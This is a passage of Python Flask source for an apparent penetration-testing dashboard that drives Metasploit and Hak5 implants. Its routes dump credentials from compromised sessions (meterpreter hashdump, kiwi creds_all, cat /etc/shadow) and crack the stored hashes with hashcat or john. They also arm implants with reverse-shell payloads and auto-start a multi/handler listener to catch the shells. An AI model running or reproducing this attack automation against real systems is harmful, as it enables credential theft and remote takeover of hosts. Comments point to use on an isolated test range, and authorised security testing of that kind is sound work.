    Run an appropriate credential-dump command for the session type, parse the
    output, and push every parsed cred into the credential store. Returns
    {captured: N, sample: [...]}.
    """
    from modules.credentials import (parse_hashdump_output,
                                      parse_kiwi_creds,
                                      parse_shadow_output,
                                      parse_session_output)

    if not msf_engine.is_connected():
        return jsonify({'status': 'error', 'captured': 0,
                        'message': 'Not connected to Metasploit RPC'}), 409

    stype = msf_engine._session_type(sid)
    sess_target, platform = '', ''
    for s in msf_engine.list_sessions():
        if str(s.get('id')) == str(sid):
            sess_target = s.get('target', '')
            platform = (s.get('platform') or '').lower()
            break
    else:
        return jsonify({'status': 'error', 'captured': 0,
                        'message': f'Session {sid} not found in msfrpcd'}), 404

    is_windows = 'win' in platform
    creds, errs = [], []

    def _run(fn, *a, **kw):
        r = fn(*a, **kw)
        if r.get('session_dead'):
            errs.append('session died')
        return r.get('output', '') or ''

    if stype == 'meterpreter':
        if is_windows or not platform:
            out = _run(msf_engine.session_meterpreter_run, sid, 'hashdump', timeout=30)
            creds = parse_hashdump_output(out, host_ip=sess_target,
                                          source_tool='meterpreter_hashdump')
            if not creds:                       # mimikatz/kiwi fallback
                out2 = _run(msf_engine.session_meterpreter_run, sid,
                            'load kiwi', timeout=20)
                out2 += '\n' + _run(msf_engine.session_meterpreter_run, sid,
                                    'creds_all', timeout=30)
                creds = parse_kiwi_creds(out2, host_ip=sess_target)
        if not creds:                           # Linux meterpreter → shadow
            out = _run(msf_engine.session_meterpreter_run, sid,
                       'shell -c "cat /etc/shadow"', timeout=15)
            creds = parse_shadow_output(out, host_ip=sess_target)
    else:
        # Raw shell: Linux → /etc/shadow; Windows cmd/powershell has no trivial
        # parseable dump, so try shadow anyway then the composite parser on output.
        out = _run(msf_engine.session_run, sid, 'cat /etc/shadow', timeout=10)
        creds = parse_shadow_output(out, host_ip=sess_target)
        if not creds and out:
            creds = parse_session_output(out, host_ip=sess_target)

    added_ids = []
    for c in creds:                              # per-cred guard
        try:
            added_ids.append(cred_store.add(c))
        except Exception as exc:
            errs.append(f"{c.get('type', '?')}: {exc}")
    return jsonify({
        'status':    'ok',
        'captured':  len(added_ids),
        'session':   sid,
        'session_type': stype,
        'errors':    errs,
        'sample':    [{'username': c.get('username'),
                       'type': c.get('type'),
                       'host_ip': c.get('host_ip')}
                       for c in creds[:5]],
    })


# ── Shell page route ─────────────────────────────────────────────────────────

@app.route('/shell')
def page_shell():
    """Legacy route — interactive shell lives on the Exploit page."""
    sid = request.args.get('sid')
    dest = '/exploit'
    if sid:
        dest += f'?sid={sid}'
    return redirect(dest)


# ─────────────────────────────────────────────────────────────────────────────
#  LOOT API
# ─────────────────────────────────────────────────────────────────────────────

# ─────────────────────────────────────────────────────────────────────────────
#  ENUMERATE API
# ─────────────────────────────────────────────────────────────────────────────

@app.route('/api/enum/start', methods=['POST'])
def api_enum_start():
    data      = request.get_json(silent=True) or {}
    client_id = data.get('client_id') or str(uuid.uuid4())
    q         = _get_queue(client_id)
    hosts     = [h for h in scan_engine.get_hosts_with_ports()
                 if h.get('ip') in data.get('ips', [h.get('ip')])]
    if not hosts:
        hosts = scan_engine.get_hosts_with_ports()

    def on_output(line):
        ops_log.append_enum_line(client_id, line)
        try: q.put_nowait({'type': 'output', 'data': line})
        except: pass

    def on_finding(f):
        try: q.put_nowait({'type': 'finding', 'finding': f})
        except: pass

    def on_complete(findings):
        ops_log.finish_enum_job(client_id, findings)
        count = sum(len(v) for v in findings.values())
        try: q.put_nowait({'type': 'complete', 'finding_count': count})
        except: pass

    ops_log.begin_enum_job(client_id, hosts, data)
    started = enum_engine.start_enum(hosts, data,
                on_output=on_output, on_finding=on_finding, on_complete=on_complete)
    if not started:
        return jsonify({'status': 'error', 'message': 'Enumeration already running'}), 409
    return jsonify({'status': 'started', 'client_id': client_id, 'host_count': len(hosts)})


@app.route('/api/enum/stream')
def api_enum_stream():
    client_id = request.args.get('client_id', 'default')
    q         = _get_queue(client_id)

    def generate():
        try:
            while True:
                try:
                    event = q.get(timeout=25)
                    yield f"data: {json.dumps(event)}\n\n"
                    if event.get('type') in ('complete', 'error'):
                        break
                except queue.Empty: yield f"data: {json.dumps({'type':'heartbeat'})}\n\n"
        finally:
            _drop_queue(client_id)

    return Response(stream_with_context(generate()),
        mimetype='text/event-stream',
        headers={'Cache-Control': 'no-cache', 'X-Accel-Buffering': 'no'})


@app.route('/api/enum/status')
def api_enum_status():
    return jsonify(enum_engine.get_status())


# ── MSF Validation stage ──────────────────────────────────────────────────────
# Batch-runs MSF check logic against a target's candidate exploits to separate
# what's *possible* (a module exists) from what's *feasible* (the target's own
# preconditions are met). Verdicts persist and badge the Exploit tab.
@app.route('/api/msf/validate/start', methods=['POST'])
def api_msf_validate_start():
    data = request.get_json(silent=True) or {}
    ip   = data.get('ip')
    if not ip:
        return jsonify({'status': 'error', 'message': 'No target ip provided'}), 400
    if not msf_engine.is_connected():
        return jsonify({'status': 'error',
                        'message': 'Not connected to Metasploit RPC — connect first'}), 409

    client_id = data.get('client_id') or str(uuid.uuid4())
    q         = _get_queue(client_id)
    stealth   = data.get('stealth', 0)

    # Build the candidate list the same way the Exploit tab does, so validation
    # mirrors exactly the suggestions the operator will act on.
    hosts = scan_engine.get_hosts_with_ports()
    host  = next((h for h in hosts if h.get('ip') == ip), None)
    if not host:
        return jsonify({'status': 'error',
                        'message': f'No scanned host {ip} — scan it first'}), 404

    enum_findings = enum_engine.get_findings_for_host(ip)
    suggestions   = cve_chain.suggest(host, host.get('ports', []),
                                      enum_findings=enum_findings)
    all_msf    = [s for s in suggestions if s.get('msf_module')]
    # Recon scanners (auxiliary/scanner/*) are NOT feasibility-validated — they
    # have no meaningful `check` and just add NO_CHECK noise + ~10s each. They
    # now live under Enumerate → MSF Scanner Modules. Validate exploits only.
    candidates   = [s for s in all_msf if not is_scanner_module(s.get('msf_module'))]
    scanner_count = len(all_msf) - len(candidates)
    if not candidates:
        msg = (f'No exploit-class candidates to validate for {ip}'
               + (f' ({scanner_count} scanner module(s) moved to Enumerate)'
                  if scanner_count else ' — run enumeration first'))
        return jsonify({'status': 'error', 'message': msg}), 404

    # Clear stale verdicts for this host so re-runs start clean
    msf_validator.clear_host(ip)

    def on_progress(line):
        try: q.put_nowait({'type': 'output', 'data': line})
        except Exception: pass

    def on_verdict(v):
        try: q.put_nowait({'type': 'verdict', 'verdict': v})
        except Exception: pass

    def on_complete(verdicts):
        vuln = sum(1 for x in verdicts.values() if x.get('verdict') == 'VULNERABLE')
        try: q.put_nowait({'type': 'complete', 'vulnerable_count': vuln,
                           'total': len(verdicts)})
        except Exception: pass

    started = msf_validator.validate(ip, candidates, stealth=stealth,
                on_progress=on_progress, on_verdict=on_verdict,
                on_complete=on_complete)
    if not started:
        return jsonify({'status': 'error',
                        'message': 'Validation already running'}), 409
    return jsonify({'status': 'started', 'client_id': client_id,
                    'candidate_count': len(candidates),
                    'scanner_count': scanner_count})


@app.route('/api/msf/validate/stream')
def api_msf_validate_stream():
    client_id = request.args.get('client_id', 'default')
    q         = _get_queue(client_id)

    def generate():
        try:
            while True:
                try:
                    event = q.get(timeout=25)
                    yield f"data: {json.dumps(event)}\n\n"
                    if event.get('type') in ('complete', 'error'):
                        break
                except queue.Empty:
                    yield f"data: {json.dumps({'type':'heartbeat'})}\n\n"
        finally:
            _drop_queue(client_id)

    return Response(stream_with_context(generate()),
        mimetype='text/event-stream',
        headers={'Cache-Control': 'no-cache', 'X-Accel-Buffering': 'no'})


@app.route('/api/msf/validate/status')
def api_msf_validate_status():
    return jsonify(msf_validator.get_status())


@app.route('/api/msf/validate/results')
def api_msf_validate_results():
    ip = request.args.get('ip')
    if not ip:
        return jsonify({'verdicts': {}})
    return jsonify({'verdicts': msf_validator.get_verdicts_for_host(ip)})


# ── MSF scanner modules (post-enumeration recon) ─────────────────────────────
# Auxiliary scanners are recon, not exploits. They are surfaced + run here
# (under Enumerate) instead of being feasibility-validated.
def _scanner_candidates_for(ip):
    """Return the de-duplicated scanner-module candidate dicts for a host."""
    hosts = scan_engine.get_hosts_with_ports()
    host  = next((h for h in hosts if h.get('ip') == ip), None)
    if not host:
        return None
    enum_findings = enum_engine.get_findings_for_host(ip)
    suggestions   = cve_chain.suggest(host, host.get('ports', []),
                                      enum_findings=enum_findings)
    seen, out = set(), []
    for s in suggestions:
        mod = s.get('msf_module')
        if not mod or mod in seen or not is_scanner_module(mod):
            continue
        seen.add(mod)
        out.append({'msf_module': mod,
                    'msf_rport':  s.get('msf_rport') or s.get('port'),
                    'cve':        s.get('cve'),
                    'description': s.get('description') or s.get('name') or ''})
    return out


@app.route('/api/msf/scanners/list')
def api_msf_scanners_list():
    ip = request.args.get('ip')
    if not ip:
        return jsonify({'scanners': []})
    cands = _scanner_candidates_for(ip)
    if cands is None:
        return jsonify({'scanners': [], 'message': f'No scanned host {ip}'}), 404
    return jsonify({'scanners': cands, 'count': len(cands)})


@app.route('/api/msf/scanners/start', methods=['POST'])
def api_msf_scanners_start():
    data = request.get_json(silent=True) or {}
    ip   = data.get('ip')
    if not ip:
        return jsonify({'status': 'error', 'message': 'No target ip provided'}), 400
    if not msf_engine.is_connected():
        return jsonify({'status': 'error',
                        'message': 'Not connected to Metasploit RPC — connect first'}), 409

    client_id = data.get('client_id') or str(uuid.uuid4())
    q         = _get_queue(client_id)
    stealth   = data.get('stealth', 0)

    cands = _scanner_candidates_for(ip)
    if cands is None:
        return jsonify({'status': 'error',
                        'message': f'No scanned host {ip} — scan it first'}), 404

    # Restrict to the operator-selected subset if provided; else run all.
    wanted = set(data.get('modules') or [])
    if wanted:
        cands = [c for c in cands if c['msf_module'] in wanted]
    if not cands:
        return jsonify({'status': 'error',
                        'message': f'No scanner modules selected for {ip}'}), 404

    def on_progress(line):
        try: q.put_nowait({'type': 'output', 'data': line})
        except Exception: pass

    def on_result(summary):
        try: q.put_nowait({'type': 'result', 'result': summary})
        except Exception: pass

    def on_complete(results):
        try: q.put_nowait({'type': 'complete', 'total': len(results)})
        except Exception: pass

    started = scanner_runner.run(ip, cands, stealth=stealth,
                on_progress=on_progress, on_result=on_result,
                on_complete=on_complete)
    if not started:
        return jsonify({'status': 'error',
                        'message': 'A scanner run is already in progress'}), 409
    return jsonify({'status': 'started', 'client_id': client_id,
                    'scanner_count': len(cands)})


@app.route('/api/msf/scanners/stream')
def api_msf_scanners_stream():
    client_id = request.args.get('client_id', 'default')
    q         = _get_queue(client_id)

    def generate():
        try:
            while True:
                try:
                    event = q.get(timeout=25)
                    yield f"data: {json.dumps(event)}\n\n"
                    if event.get('type') in ('complete', 'error'):
                        break
                except queue.Empty:
                    yield f"data: {json.dumps({'type':'heartbeat'})}\n\n"
        finally:
            _drop_queue(client_id)

    return Response(stream_with_context(generate()),
        mimetype='text/event-stream',
        headers={'Cache-Control': 'no-cache', 'X-Accel-Buffering': 'no'})


@app.route('/api/enum/findings')
def api_enum_findings():
    ip = request.args.get('ip')
    if ip:
        return jsonify({'findings': enum_engine.get_findings_for_host(ip)})
    return jsonify({'findings': enum_engine.get_findings_flat()})


@app.route('/api/enum/tools')
def api_enum_tools():
    return jsonify({'tools': EnumEngine.available_tools()})


@app.route('/api/loot/generate', methods=['POST'])
def api_loot_generate():
    data   = request.get_json(silent=True) or {}
    report = loot_manager.generate_report(
        scan_results  = scan_engine.get_results(),
        sessions      = msf_engine.list_sessions(),
        fmt           = data.get('format', 'html'),
        kind          = data.get('kind', 'full'),
        enum_findings = enum_engine.get_findings_flat(),
        credentials   = cred_store.list(),
        disrupt_results=dos_engine.get_results(),  # NEW
    )
    return jsonify(report)


@app.route('/api/session/bundle', methods=['POST'])
def api_session_bundle():
    """Tool hygiene: collect the whole engagement into one timestamped folder
    under ./session/ — both reports (vulnerabilities + findings), a credentials
    export, and a copy of the loot/ artifacts, plus a manifest."""
    import shutil
    ts   = datetime.now().strftime('%Y%m%d_%H%M%S')
    base = H3xConfig.SESSION_DIR / f'h3x_session_{ts}'
    try:
        (base / 'reports').mkdir(parents=True, exist_ok=True)
        (base / 'loot').mkdir(parents=True, exist_ok=True)
    except OSError as exc:
        return jsonify({'status': 'error', 'message': f'mkdir failed: {exc}'}), 500

    scan  = scan_engine.get_results()
    sess  = msf_engine.list_sessions()
    finds = enum_engine.get_findings_flat()
    creds = cred_store.list()
    written = []

    for kind in ('vulnerabilities', 'findings'):
        for fmt in ('html', 'json'):
            r = loot_manager.generate_report(
                scan, sess, fmt=fmt, kind=kind,
                enum_findings=finds, credentials=creds,
                disrupt_results=dos_engine.get_results(),  # NEW
                out_dir=base / 'reports')
            if r.get('status') == 'ok':
                written.append(f"reports/{r['filename']}")

    try:
        (base / 'credentials.json').write_text(
            json.dumps({'credentials': creds, 'count': len(creds)},
                       indent=2, default=str))
        written.append('credentials.json')
    except OSError:
        pass

    copied = 0
    try:
        for f in H3xConfig.LOOT_DIR.glob('*'):
            if f.is_file():
                shutil.copy2(f, base / 'loot' / f.name)
                copied += 1
    except OSError:
        pass

    manifest = {
        'created':     datetime.now().isoformat(),
        'target':      scan.get('meta', {}).get('target', ''),
        'hosts':       len(scan.get('hosts', [])),
        'sessions':    len(sess),
        'findings':    len(finds),
        'credentials': len(creds),
        'loot_files':  copied,
        'files':       written,
    }
    try:
        (base / 'manifest.json').write_text(json.dumps(manifest, indent=2, default=str))
    except OSError:
        pass
    return jsonify({'status': 'ok', 'path': str(base),
                    'files': written, 'manifest': manifest})


@app.route('/api/loot/reports')
def api_loot_list():
    return jsonify({'reports': loot_manager.list_reports()})


_REPORT_NAME_RX = re.compile(r'^h3x-dash_report_[a-z0-9_]+\.(html|json)$')


@app.route('/api/loot/download/<filename>')
def api_loot_download(filename):
    report_dir = H3xConfig.REPORT_DIR.resolve()
    # Reject any path components that could escape the reports directory.
    if '/' in filename or '\\' in filename or '..' in filename:
        return jsonify({'error': 'Invalid filename'}), 400
    # Whitelist: only genuine generated report files are downloadable, so a file
    # dropped into reports/ by another process can't be exfiltrated by name.
    if not _REPORT_NAME_RX.match(filename):
        return jsonify({'error': 'Not a report file'}), 400
    # Collapse to the basename as a final belt-and-suspenders against traversal.
    safe_path = (report_dir / Path(filename).name).resolve()
    try:
        safe_path.relative_to(report_dir)   # raises ValueError if outside
    except ValueError:
        return jsonify({'error': 'Path traversal rejected'}), 400
    if not safe_path.is_file():
        return jsonify({'error': 'File not found'}), 404
    try:
        return send_file(safe_path, as_attachment=True)
    except PermissionError:
        return jsonify({'error': 'Permission denied reading report file'}), 403


# ─────────────────────────────────────────────────────────────────────────────

# ─────────────────────────────────────────────────────────────────────────────
#  MSFRPCD DAEMON API
# ─────────────────────────────────────────────────────────────────────────────

@app.route('/api/msf/daemon')
def api_msf_daemon():
    """Current msfrpcd daemon status — state, message, pid, log path."""
    return jsonify(msf_daemon_status())


@app.route('/api/msf/daemon/stop', methods=['POST'])
def api_msf_daemon_stop():
    """Stop the msfrpcd instance H3x-Dash started (no-op if started externally)."""
    msf_daemon_stop()
    return jsonify({'status': 'ok', 'message': 'Stop signal sent'})


@app.route('/api/msf/daemon/log')
def api_msf_daemon_log():
    """Return the last 50 lines of the msfrpcd log."""
    from pathlib import Path
    log_path = Path('/tmp/h3x_msfrpcd.log')
    if not log_path.exists():
        return jsonify({'lines': [], 'message': 'No log file found'})
    lines = log_path.read_text(errors='replace').splitlines()
    return jsonify({'lines': lines[-50:], 'total': len(lines)})


# ─────────────────────────────────────────────────────────────────────────────
#  PRE-FLIGHT API
# ─────────────────────────────────────────────────────────────────────────────

@app.route('/api/preflight')
def api_preflight():
    """Return cached startup pre-flight results, or run fresh if not ready."""
    if _preflight_results:
        return jsonify(_preflight_results)
    checker = PreflightChecker()
    return jsonify(checker.summary())


@app.route('/api/preflight/refresh', methods=['POST'])
def api_preflight_refresh():
    """Force a fresh pre-flight check."""
    checker = PreflightChecker()
    result  = checker.summary()
    global _preflight_results
    _preflight_results = result
    return jsonify(result)


# ─────────────────────────────────────────────────────────────────────────────
#  MSF MODULE SCANNER API
# ─────────────────────────────────────────────────────────────────────────────

@app.route('/api/modules/search')
def api_modules_search():
    q     = request.args.get('q', '').strip()
    mtype = request.args.get('type', '').strip()
    limit = request.args.get('limit', 100, type=int) or 100
    if not q:
        return jsonify({'modules': [], 'count': 0, 'stats': msf_scanner.stats()})
    results = msf_scanner.search(q, mtype=mtype, limit=limit)
    return jsonify({'modules': results, 'count': len(results),
                    'stats': msf_scanner.stats()})


@app.route('/api/modules/cve/<cve>')
def api_modules_by_cve(cve):
    modules = msf_scanner.by_cve(cve)
    return jsonify({'cve': cve, 'modules': modules, 'count': len(modules)})


@app.route('/api/modules/match', methods=['POST'])
def api_modules_match():
    """Match a list of enum findings to locally installed MSF modules."""
    findings = (request.get_json(silent=True) or {}).get('findings', [])
    matched  = msf_scanner.match_findings(findings)
    return jsonify({'matches': matched, 'cve_count': len(matched)})


@app.route('/api/modules/stats')
def api_modules_stats():
    return jsonify(msf_scanner.stats())


@app.route('/api/modules/rescan', methods=['POST'])
def api_modules_rescan():
    msf_scanner.trigger_rescan()
    return jsonify({'status': 'rescan started'})


# ─────────────────────────────────────────────────────────────────────────────
#  CREDENTIALS — central store, populated from enum findings + manual entry
# ─────────────────────────────────────────────────────────────────────────────

@app.route('/credentials')
def credentials_page():
    creds = cred_store.list()
    stats = cred_store.stats()
    return render_template('credentials.html',
                           creds=creds, stats=stats, active='credentials')


@app.route('/api/creds', methods=['GET'])
def api_creds_list():
    filters = {}
    for k in ('type', 'host_ip', 'source_tool'):
        v = request.args.get(k)
        if v:
            filters[k] = v
    v = request.args.get('verified')
    if v in ('true', 'false'):
        filters['verified'] = (v == 'true')
    creds = cred_store.list(**filters)
    return jsonify({'credentials': creds,
                    'count':       len(creds),
                    'stats':       cred_store.stats()})


@app.route('/api/creds', methods=['POST'])
def api_creds_add():
    """Manually add a credential. Body: {type, username, value, ...}."""
    data = request.get_json(silent=True) or {}
    if 'type' not in data:
        return jsonify({'error': 'type is required'}), 400
    try:
        cid = cred_store.add({**data, 'source_tool': data.get('source_tool', 'manual')})
        return jsonify({'id': cid, 'status': 'added'})
    except ValueError as exc:
        return jsonify({'error': str(exc)}), 400


@app.route('/api/creds/<cred_id>', methods=['DELETE'])
def api_creds_remove(cred_id):
    if cred_store.remove(cred_id):
        return jsonify({'status': 'removed'})
    return jsonify({'error': 'not found'}), 404


@app.route('/api/creds/<cred_id>/verify', methods=['POST'])
def api_creds_verify(cred_id):
    data    = request.get_json(silent=True) or {}
    success = bool(data.get('success', True))
    if cred_store.mark_verified(cred_id, success):
        return jsonify({'status': 'updated', 'verified': success})
    return jsonify({'error': 'not found'}), 404


@app.route('/api/creds/<cred_id>/tag', methods=['POST'])
def api_creds_tag(cred_id):
    tag = (request.get_json(silent=True) or {}).get('tag', '').strip()
    if not tag:
        return jsonify({'error': 'tag is required'}), 400
    if cred_store.tag(cred_id, tag):
        return jsonify({'status': 'tagged'})
    return jsonify({'error': 'not found'}), 404


@app.route('/api/creds/stats')
def api_creds_stats():
    return jsonify(cred_store.stats())


@app.route('/api/creds/cracker')
def api_creds_cracker():
    """Which offline crackers + a wordlist are available (gates the UI button)."""
    from modules import cracker
    return jsonify(cracker.detect())


@app.route('/api/creds/<cred_id>/crack', methods=['POST'])
def api_creds_crack(cred_id):
    """Crack a stored NTLM/unix hash with hashcat/john against a wordlist.
    On success the plaintext is stored back as a verified password credential
    (so it flows into the exploit-resolver auto-fill) and tagged on the hash."""
    from modules import cracker
    cred = cred_store.get(cred_id)
    if not cred:
        return jsonify({'status': 'error', 'message': 'credential not found'}), 404
    if not cracker.crackable(cred):
        return jsonify({'status': 'error', 'cracked': False,
                        'message': 'only NTLM / unix hashes can be cracked'}), 400
    data = request.get_json(silent=True) or {}
    try:
        timeout = max(5, min(600, int(data.get('timeout', 120))))
    except (TypeError, ValueError):
        timeout = 120
    result = cracker.crack_credential(cred, wordlist=data.get('wordlist'),
                                      timeout=timeout)
    if result.get('cracked'):
        plain = result['plaintext']
        cred_store.tag(cred_id, f'cracked:{plain}')
        cred_store.mark_verified(cred_id, True)
        try:
            cred_store.add({
                'type': 'password', 'username': cred.get('username', ''),
                'value': plain, 'domain': cred.get('domain'),
                'host_ip': cred.get('host_ip'), 'host_port': cred.get('host_port'),
                'service': cred.get('service', ''),
                'source_tool': result.get('tool', 'cracker'), 'verified': True,
            })
        except Exception:
            pass
    return jsonify(result)


# ─────────────────────────────────────────────────────────────────────────────
#  HAK5 / SPECTRUM
#  Two distinct flows, both backed by ImplantRegistry + WirelessController:
#    PAYLOAD   Inventory (connect-to-add) -> Arm -> Deploy (liability-gated)
#    SPECTRUM  Inventory -> Connect API -> Functions -> PCAP/Hashcat
# ─────────────────────────────────────────────────────────────────────────────

@app.route('/payload')
def payload_page():
    return render_template('payload.html', active='payload')


@app.route('/spectrum')
def spectrum_page():
    return render_template('spectrum.html', active='spectrum')


@app.route('/implants')   # back-compat: old link → new Payload page
def implants_legacy():
    return redirect('/payload')


# ── Inventory (shared by both flows) ──────────────────────────────────────────

@app.route('/api/implants/tree')
def api_implants_tree():
    klass = request.args.get('class') or None     # 'payload' or 'spectrum'
    if klass not in (None, 'payload', 'spectrum'):
        return jsonify({'error': 'class must be payload or spectrum'}), 400
    return jsonify({
        'tree':     implant_registry.tree(klass),
        'stats':    implant_registry.stats(klass),
        'products': [p for p in IMPLANT_PRODUCTS.values()
                     if klass is None or p.get('class') == klass],
    })


@app.route('/api/implants/connect-add', methods=['POST'])
def api_implants_connect_add():
    """Validate the callback FIRST, then add the instance on success.

    USB transports skip the probe (no callback exists) — they're added directly.
    On unreachable: returns 200 with status='unreachable' and the validation
    detail so the UI can show why; nothing is added to the registry.
    """
    data = request.get_json(silent=True) or {}
    pid = data.get('product_id')
    if pid not in IMPLANT_PRODUCTS:
        return jsonify({'error': f'unknown product: {pid!r}'}), 400
    try:
        result = implant_registry.add_validated(
            pid,
            device_id=data.get('device_id'),
            host=data.get('host'),
            port=data.get('port'),
            username=data.get('username', ''),
            notes=data.get('notes', ''),
        )
        return jsonify(result)
    except ValueError as exc:
        return jsonify({'error': str(exc)}), 400


@app.route('/api/implants/instance/<instance_id>', methods=['PATCH'])
def api_implants_update(instance_id):
    data = request.get_json(silent=True) or {}
    inst = implant_registry.update(instance_id, **data)
    if inst is None:
        return jsonify({'error': 'not found or no valid fields'}), 404
    return jsonify({'status': 'updated', 'instance': inst})


@app.route('/api/implants/instance/<instance_id>', methods=['DELETE'])
def api_implants_remove(instance_id):
    if implant_registry.remove(instance_id):
        return jsonify({'status': 'removed'})
    return jsonify({'error': 'not found'}), 404


@app.route('/api/implants/instance/<instance_id>/validate', methods=['POST'])
def api_implants_validate(instance_id):
    inst = implant_registry.get(instance_id)
    if inst is None:
        return jsonify({'error': 'not found'}), 404
    result = validate_connect(inst)
    # USB-only devices report status 'manual' (no callback) — keep online neutral
    # (None) instead of marking them offline/red.
    online = None if result.get('status') == 'manual' else bool(result['ok'])
    implant_registry.update(instance_id,
                            online=online,
                            last_validated=result['checked_at'],
                            last_detail=result['detail'])
    return jsonify({'status': 'checked', 'result': result})


@app.route('/api/implants/payloads')
def api_implants_payloads():
    product = request.args.get('product') or None
    q = request.args.get('q') or None
    return jsonify({'payloads':  list_payloads(product, q),
                    'total_all': len(list_payloads())})


# ── Vetted GitHub payload sources ─────────────────────────────────────────────
# The "access update" pull. Sources are a fixed allowlist (official Hak5 / O.MG
# repos); the update endpoint refuses any source_id not on that list, and the
# manager validates every outbound URL against the vetted org/repo before a
# request goes out. Nothing here ever fetches an operator-supplied URL.

@app.route('/api/implants/sources')
def api_implants_sources():
    return jsonify({
        'sources': payload_sources.sources(),
        'stats':   payload_sources.stats(),
    })


@app.route('/api/implants/sources/update', methods=['POST'])
def api_implants_sources_update():
    """Pull payloads from one vetted source (source_id) or all (omit it).

    Returns a step log + refreshed source state. A non-vetted source_id is
    rejected with HTTP 400; an unreachable/offline source is reported in the
    body (not an error) so the air-gapped range degrades gracefully.
    """
    data = request.get_json(silent=True) or {}
    source_id = (data.get('source_id') or '').strip() or None
    result = payload_sources.update(source_id)
    if result.get('status') == 'rejected':
        return jsonify(result), 400
    return jsonify(result)


@app.route('/api/implants/sources/describe', methods=['POST'])
def api_implants_sources_describe():
    """Lazily fetch a synced payload's description from its vetted source.

    Body: {source_id, path}. The (source_id, path) pair must exist in the synced
    set for a vetted source; arbitrary paths are refused. Cached after first
    fetch so re-opening a row is free.
    """
    data = request.get_json(silent=True) or {}
    source_id = (data.get('source_id') or '').strip()
    path = (data.get('path') or '').strip()
    if not source_id or not path:
        return jsonify({'status': 'error', 'reason': 'source_id and path required'}), 400
    result = payload_sources.describe(source_id, path)
    code = {'rejected': 400, 'not_found': 404}.get(result.get('status'), 200)
    return jsonify(result), code


# ── Payload flow: ARM / DISARM / DEPLOY / RETURN ─────────────────────────────
#
# Callback contract: a reverse_shell payload, when armed, auto-stages an MSF
# multi/handler on this host (the C2). The Hak5 device fires, the reverse
# connection lands as an MSF session, and it shows up in the existing Shell tab.
# The "callback status" (waiting -> landed) is computed by correlating the
# handler's LPORT against live MSF sessions, so it works for ANY OS/payload the
# operator targets (nothing here is Metasploitable-specific).

import socket as _socket
from modules.implant_engine import payload_by_name as _payload_by_name


def _lhost_toward(host: str) -> str:
    """Source IP this host would use to reach `host` (range-appropriate LHOST).

    Falls back to the primary outbound interface, then loopback. No internet
    needed: on an isolated range we route toward the device's own segment.
    """
    host = (host or '').strip()
    candidates = [h for h in (host, '192.168.1.1', '10.0.0.1') if h]
    for tgt in candidates:
        try:
            s = _socket.socket(_socket.AF_INET, _socket.SOCK_DGRAM)
            s.connect((tgt, 9))            # UDP connect sends nothing
            ip = s.getsockname()[0]
            s.close()
            if ip and not ip.startswith('127.'):
                return ip
        except OSError:
            continue
    return '127.0.0.1'


def _next_lport(start: int = 4444) -> int:
    """First LPORT at/above `start` not already claimed by an armed handler."""
    used = set()
    for i in implant_registry.armed():
        h = i.get('handler') or {}
        if h.get('lport'):
            try:
                used.add(int(h['lport']))
            except (TypeError, ValueError):
                pass
    port = start
    while port in used:
        port += 1
    return port


def _spawn_handler(lhost: str, lport: int, payload_module: str) -> None:
    """Start exploit/multi/handler as a background job. Best-effort: never
    blocks the arm request and never raises into it."""
    def _run():
        try:
            msf_engine.run_exploit(
                'exploit/multi/handler',
                {'LHOST': lhost, 'LPORT': int(lport), 'ExitOnSession': False},
                payload=payload_module, action='run', poll_timeout=15,
            )
        except Exception as exc:        # pragma: no cover - depends on live MSF
            print(f"  [hak5] handler start failed on {lhost}:{lport}: {exc}")
    threading.Thread(target=_run, daemon=True, name=f'hak5-handler-{lport}').start()


def _callback_status(inst: dict) -> dict:
    """Live status of an armed instance's callback. Generic across payloads."""
    cb = inst.get('armed_callback')
    if not cb or cb == 'none':
        return {'callback': cb or 'none', 'status': 'n/a', 'detail': '', 'session_id': None}

    if cb == 'reverse_shell':
        handler = inst.get('handler') or {}
        lport = handler.get('lport')
        if msf_engine.is_connected() and lport:
            try:
                lport_int = int(lport)
            except (TypeError, ValueError):
                lport_int = None
            for s in msf_engine.list_sessions():
                # Compare the tunnel's port as an integer — a suffix match would
                # make handler port 44 spuriously "land" a :4444 session tunnel.
                tunnel = str(s.get('tunnel', ''))
                tport = None
                if ':' in tunnel:
                    try:
                        tport = int(tunnel.rsplit(':', 1)[1])
                    except (ValueError, IndexError):
                        tport = None
                if lport_int is not None and tport == lport_int:
                    return {'callback': cb, 'status': 'landed',
                            'detail': f"session {s['id']} ({s.get('type') or 'shell'}) -> Shell tab",
                            'session_id': s['id']}
        hstat = handler.get('status') or 'pending'
        return {'callback': cb, 'status': 'waiting',
                'detail': f"handler {hstat} on {handler.get('lhost')}:{lport}", 'session_id': None}

    if cb == 'reverse_ssh':
        return {'callback': cb, 'status': 'waiting',
                'detail': 'reverse SSH foothold (pivot wiring is next phase)', 'session_id': None}

    # creds / loot land via collection, which is the scaffolded pull phase.
    dest = 'Credentials' if cb == 'creds' else 'Loot / Hashcat'
    return {'callback': cb, 'status': 'awaiting collection',
            'detail': f'routes to {dest} (pull lands in a later phase)', 'session_id': None}


def _armed_with_callbacks() -> list[dict]:
    out = []
    for inst in implant_registry.armed():
        inst = dict(inst)
        inst['callback_status'] = _callback_status(inst)
        out.append(inst)
    return out


@app.route('/api/implants/instance/<instance_id>/arm', methods=['POST'])
def api_implants_arm(instance_id):
    """One-click install: stage payload at the C2 and arm the device, and for a
    reverse_shell payload, auto-start the MSF multi/handler that catches it.

    The per-transport push of payload bytes (SCP / O.MG REST / inject.bin) is
    still the next phase; the durable state (what is armed where, the handler,
    and the callback contract) is live today.
    """
    data    = request.get_json(silent=True) or {}
    payload = (data.get('payload') or '').strip()
    inst    = implant_registry.get(instance_id)
    if not inst:
        return jsonify({'error': 'instance not found'}), 404
    compat = [p['name'] for p in list_payloads(inst['product_id'])]
    if payload not in compat:
        return jsonify({'error': f'payload {payload!r} not compatible with {inst["product_name"]}',
                        'compatible': compat}), 400

    meta     = _payload_by_name(payload) or {}
    callback = meta.get('callback', 'none')
    transport = inst['transport']
    slot = ('/root/payload/'      if transport == 'ssh'
       else 'WiFi-API slot'       if transport == 'wifi'
       else 'inject.bin')
    steps = [
        {'cls': 't-info', 'msg': f"[c2] stage payload {payload} from ./payloads/"},
        {'cls': 't-info', 'msg': f"[{transport}] push to {inst['device_id']} ({inst.get('host') or '(usb)'}{':'+str(inst['port']) if inst.get('port') else ''})"},
        {'cls': 't-info', 'msg': f"[device] write to native slot ({slot})"},
    ]

    handler = None
    if callback == 'reverse_shell':
        # Operator may override any of these; defaults are OS-agnostic.
        lhost = (data.get('lhost') or '').strip() or _lhost_toward(inst.get('host'))
        try:
            lport = int(data.get('lport'))
